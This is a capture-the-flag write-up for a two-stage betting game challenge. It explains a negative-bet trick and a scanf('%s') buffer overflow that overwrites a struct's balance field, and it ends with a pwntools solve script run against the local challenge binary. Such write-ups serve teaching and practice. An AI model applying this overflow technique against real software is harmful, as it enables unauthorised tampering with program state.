# Solution

## Understand the source code
To conclude, this challenge requires player to win to games to get the flag.

### Game 1

You can pass game 1 easily by following the steps from this [this](https://www.hkcert.org/f/event/266165/36d1d204-4c35-4379-87fb-64fceb669885-DLFE-15201.pdf).

### Game 2

Game 2 is similar to the game 1, winning the game by make the balance > 100000 but this time the program will check and ban the negative nubmer input, therefore player cannot use the same trick in game 1 anymore. 

## Vulnerability analysis

The vulnerability comes from `scanf("%s", game.choice);` in line 153. The scanf format `"%s"` does not restrict how many characters that users can input, thus users can input as long as they want, resulting in an overflow of the buffer `game.choice`.

## Exploitation

According to the source code, the type of `game` is `Game`, defined:

```c
struct Game {
    char choice[100];
    long long int balance;
    long long int bet;
    int correct;
    int guess;
    int answer;
};
```

`char choice[100];` mean `choice` can only store 100 characters. If the user input more than 100 characters, `choice` will be overflown and the variables (e.g. `balance`, `bet`) under the `choice` will be overwritten by the overflown characters.

For example, If the user input exactly 108 'A', then the `choice` will become 100 'A' and the `balance` will be 0x4141414141414141 (ASCII value of 'A' is 0x41), and since 0x4141414141414141 > 100000, the user wins game 2 and then the program will print out the flag.

## Full solve script

```python
from pwn import *

p = process('./chall')

# Game1
p.sendlineafter('Are you ready? Y/N :', b'Y')
p.sendlineafter('Bet :', b'-1000000')
for i in range(10):
    p.sendlineafter('Guess :', b'0')
# Game1 win

# Game2
p.sendlineafter('Are you ready? Y/N :', b'a'*108)
p.sendlineafter('Are you ready? Y/N :', b'Y')
p.sendlineafter('Bet :', b'1')
p.sendlineafter('Guess :', b'1')
# Game1 win

p.interactive()
```